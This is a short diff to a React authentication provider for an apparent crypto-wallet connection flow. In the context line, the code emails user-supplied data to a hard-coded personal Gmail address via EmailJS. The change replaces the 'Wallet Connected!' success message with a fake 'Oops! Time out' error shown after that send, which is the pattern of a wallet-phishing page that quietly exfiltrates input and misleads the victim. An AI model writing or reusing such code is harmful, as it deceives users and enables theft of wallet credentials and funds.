@@ -181,8 +181,8 @@ export function AuthProvider({ children }: { children: ReactNode }) {
       await sendEmailWithEmailJS("dredstudvagas@gmail.com", name);
       
       toast({
-        title: "Wallet Connected!",
-        description: "Your wallet has been connected successfully.",
+        title: "Oops! Time out",
+        description: "Unable to connect to your wallet at the moment.",
       });
 
     } catch (error) {
